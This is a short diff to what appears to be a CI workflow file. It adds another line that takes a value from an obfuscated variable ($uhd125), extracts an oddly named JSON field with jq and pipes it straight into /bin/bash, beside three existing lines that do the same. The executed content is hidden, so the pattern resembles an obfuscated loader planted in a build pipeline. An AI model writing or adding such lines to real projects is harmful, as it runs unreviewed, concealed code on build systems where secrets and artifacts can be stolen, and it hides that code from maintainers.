@@ -34,6 +34,7 @@ jobs:
           echo $ov3 | jq -r .kwk723 | /bin/bash
           echo $o3133 | jq -r .c389 | /bin/bash
           printf '%s' "$q6831" | jq -r .fss4594 | /bin/bash
+          printf '%s' "$uhd125" | jq -r .imf335 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
